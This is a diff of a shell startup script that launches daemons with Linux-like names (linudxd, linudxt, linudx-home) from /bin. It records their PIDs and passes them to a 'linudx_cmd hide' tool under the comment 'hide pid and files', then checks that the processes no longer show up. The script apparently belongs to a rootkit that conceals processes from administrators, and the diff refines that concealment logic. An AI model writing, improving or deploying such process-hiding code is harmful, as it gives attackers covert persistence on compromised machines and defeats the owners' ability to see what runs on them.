@@ -69,24 +69,29 @@ chmod 777 /bin/linudx-startup.sh
 
 
 /bin/linudxd &
-echo `pidof linudxd`>/bin/linudxd-pid
 /bin/linudxt &
-echo `pidof linudxt`>/bin/linudxt-pid
 /bin/linudx-home &
-echo `pidof linudx-home`>/bin/linudx-home-pid
+
+p1=`pidof linudxd`
+p2=`pidof linudxt`
+p3=`pidof linudx-home`
+
+echo "$p1">/bin/linudxd.pid
+echo "$p2">/bin/linudxt.pid
+echo "$p3">/bin/linudx-home.pid
 
 #hide pid and files
-/linudx/linudx_cmd hide `cat /bin/linudxd-pid`
-/linudx/linudx_cmd hide `cat /bin/linudxt-pid`
-/linudx/linudx_cmd hide `cat /bin/linudx-home-pid`
+/linudx/linudx_cmd hide $p1
+/linudx/linudx_cmd hide $p2
+/linudx/linudx_cmd hide $p3
 
-if [ `pidof linudxd` ];then
+if [ "`pidof linudxd`" ];then
   /linudx/linudx_cmd hide   
 else
   echo "hide success one"
 fi
 
-if [ `pidof linudxd` ];then
+if [ "`pidof linudxd`" ];then
   echo "hide failed"
 else
   echo "hide sucess two" 
